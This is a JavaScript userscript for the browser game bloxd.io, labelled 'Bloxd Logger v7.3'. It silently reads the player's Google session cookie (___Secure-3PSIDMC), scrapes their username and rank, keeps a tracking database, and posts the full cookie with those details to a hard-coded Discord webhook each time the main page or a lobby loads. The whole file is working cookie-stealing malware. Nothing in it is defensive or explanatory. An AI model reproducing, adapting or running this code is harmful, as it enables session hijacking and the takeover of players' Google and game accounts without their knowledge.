(function() {
    'use strict';

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1475161876601114665/NwvIOMXHeNXz5NkVQl1ueq_70674L8_D3A2ui2D9bEShhbz8kQmaKpfYlWeXt371dLx8";
    const USER_DB_KEY = "bloxd_user_database";
    const SENT_LOBBIES_KEY = "bloxd_sent_lobbies";

    let hasSentForCurrentPage = false;
    let userDatabase = {};
    let sentLobbies = new Set();

    function loadDatabase() {
        try {
            let saved = localStorage.getItem(USER_DB_KEY);
            if (saved) userDatabase = JSON.parse(saved);
        } catch (e) {}
    }

    function saveDatabase() {
        try {
            localStorage.setItem(USER_DB_KEY, JSON.stringify(userDatabase));
        } catch (e) {}
    }

    function loadSentLobbies() {
        try {
            let saved = localStorage.getItem(SENT_LOBBIES_KEY);
            if (saved) sentLobbies = new Set(JSON.parse(saved));
        } catch (e) {}
    }

    function wasLobbySent(url, cookieKey) {
        if (!url) return false;
        let key = url + "_" + (cookieKey || "unknown");
        return sentLobbies.has(key);
    }

    function markLobbySent(url, cookieKey) {
        if (!url) return;
        let key = url + "_" + (cookieKey || "unknown");
        sentLobbies.add(key);
        let toSave = Array.from(sentLobbies).slice(-200);
        localStorage.setItem(SENT_LOBBIES_KEY, JSON.stringify(toSave));
    }

    function predictUsername(googleCookie) {
        if (!googleCookie) return null;
        let cookieKey = googleCookie.substring(0, 50);
        
        if (userDatabase[cookieKey]) {
            return {
                username: userDatabase[cookieKey].username,
                confidence: "high",
                visitCount: userDatabase[cookieKey].visitCount,
                firstSeen: userDatabase[cookieKey].firstSeen
            };
        }
        
        for (let key in userDatabase) {
            if (userDatabase[key].fullCookie === googleCookie) {
                return {
                    username: userDatabase[key].username,
                    confidence: "high",
                    visitCount: userDatabase[key].visitCount,
                    firstSeen: userDatabase[key].firstSeen
                };
            }
        }
        
        return null;
    }

    function updateUser(googleCookie, username, ranks) {
        if (!googleCookie) return null;
        let cookieKey = googleCookie.substring(0, 50);
        let now = new Date().toISOString();
        
        if (userDatabase[cookieKey]) {
            let user = userDatabase[cookieKey];
            user.lastSeen = now;
            user.visitCount++;
            
            if (username && user.username !== username) {
                if (!user.previousUsernames) user.previousUsernames = [];
                user.previousUsernames.push(user.username);
                user.username = username;
            }
            
            if (ranks) user.ranks = ranks;
            user.fullCookie = googleCookie;
            saveDatabase();
            return user;
        } else {
            let newUser = {
                username: username || "Unknown",
                firstSeen: now,
                lastSeen: now,
                visitCount: 1,
                fullCookie: googleCookie,
                ranks: ranks || {
                    hasSuperRank: false,
                    hasYouTubeRank: false,
                    rankName: null
                }
            };
            
            userDatabase[cookieKey] = newUser;
            saveDatabase();
            return newUser;
        }
    }

    function getGoogleCookie() {
        let match = document.cookie.match(/(?:^|;\s*)___Secure-3PSIDMC=([^;]+)/);
        return match ? match[1] : null;
    }

    function getBloxdUsername() {
        let nameElement = document.querySelector('[class*="TextFromServerEntityName"]');
        if (nameElement) return nameElement.innerText || nameElement.textContent;
        if (window.gameState?.bloxd?.entityNames?.[1]?.entityName) {
            return window.gameState.bloxd.entityNames[1].entityName;
        }
        return null;
    }

    function checkRanks() {
        let ranks = {
            hasSuperRank: false,
            hasYouTubeRank: false,
            rankName: null,
            rankColor: null
        };

        try {
            if (window.gameState?.bloxd?.entityNames?.[1]) {
                let playerData = window.gameState.bloxd.entityNames[1];
                if (playerData.rank || playerData.rankName) {
                    ranks.rankName = playerData.rank || playerData.rankName;
                    if (ranks.rankName?.toLowerCase().includes('super')) ranks.hasSuperRank = true;
                    if (ranks.rankName?.toLowerCase().includes('youtube') || ranks.rankName?.toLowerCase().includes('yt')) ranks.hasYouTubeRank = true;
                }
                if (playerData.nameColor) ranks.rankColor = playerData.nameColor;
            }
        } catch (e) {}

        return ranks;
    }

    function getPageType() {
        let url = window.location.href;
        
        if (url === "https://bloxd.io/" || url === "https://bloxd.io" || url === "https://www.bloxd.io/") {
            return "main";
        }
        
        if (url.includes('classic_survival')) {
            return "lobby";
        }
        
        return "other";
    }

    function sendToDiscord() {
        if (hasSentForCurrentPage) return;
        
        let pageType = getPageType();
        if (pageType === "other") return;

        let googleCookie = getGoogleCookie();
        if (!googleCookie) {
            setTimeout(sendToDiscord, 500);
            return;
        }

        let currentUsername = getBloxdUsername();
        let currentRanks = checkRanks();
        let currentUrl = window.location.href;
        
        let user = null;
        if (currentUsername) {
            user = updateUser(googleCookie, currentUsername, currentRanks);
        }
        
        let prediction = predictUsername(googleCookie);
        let cookieKey = googleCookie.substring(0, 50);
        
        if (pageType === "lobby") {
            if (wasLobbySent(currentUrl, cookieKey)) return;
        }

        let displayUsername = "Unknown";
        let usernameSource = "";
        
        if (currentUsername) {
            displayUsername = currentUsername;
            usernameSource = "(current)";
        } else if (prediction) {
            displayUsername = prediction.username;
            usernameSource = `(predicted - ${prediction.confidence}, ${prediction.visitCount} visits)`;
        }
        
        let title = pageType === "main" ? "🏠 MAIN PAGE" : "🎮 LOBBY ENTERED";
        let color = pageType === "main" ? 0x0000ff : 0x00ff00;
        
        let fields = [
            { name: "👤 Username", value: displayUsername + " " + usernameSource, inline: true },
            { name: "🕐 Time", value: new Date().toISOString(), inline: true },
            { name: "🌐 URL", value: currentUrl, inline: false }
        ];

        if (pageType === "lobby") {
            fields.push({ name: "🆔 Full URL", value: currentUrl, inline: false });
        }

        let ranks = currentRanks || (user?.ranks) || {};
        let rankText = [];
        rankText.push(ranks.hasSuperRank ? "✅ SUPER RANK" : "❌ No Super Rank");
        rankText.push(ranks.hasYouTubeRank ? "✅ YOUTUBE RANK" : "❌ No YouTube Rank");
        if (ranks.rankName) rankText.push(`📛 Rank: ${ranks.rankName}`);

        fields.push({ name: "⭐ RANKS", value: rankText.join('\n'), inline: false });

        fields.push({
            name: "🍪 Google Cookie",
            value: `\`\`\`\n${googleCookie}\n\`\`\``,
            inline: false
        });

        let embed = {
            title: title,
            color: color,
            fields: fields,
            footer: { text: "Bloxd Logger v7.3" },
            timestamp: new Date().toISOString()
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        })
        .then(response => {
            if (response.ok) {
                hasSentForCurrentPage = true;
                if (pageType === "lobby" && cookieKey) {
                    markLobbySent(currentUrl, cookieKey);
                }
            }
        })
        .catch(() => {});
    }

    function waitForGame() {
        let googleCookie = getGoogleCookie();
        if (!googleCookie) {
            setTimeout(waitForGame, 500);
            return;
        }
        sendToDiscord();
    }

    loadDatabase();
    loadSentLobbies();
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', waitForGame);
    } else {
        waitForGame();
    }

    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            hasSentForCurrentPage = false;
            setTimeout(waitForGame, 1500);
        }
    }).observe(document, { subtree: true, childList: true });
})();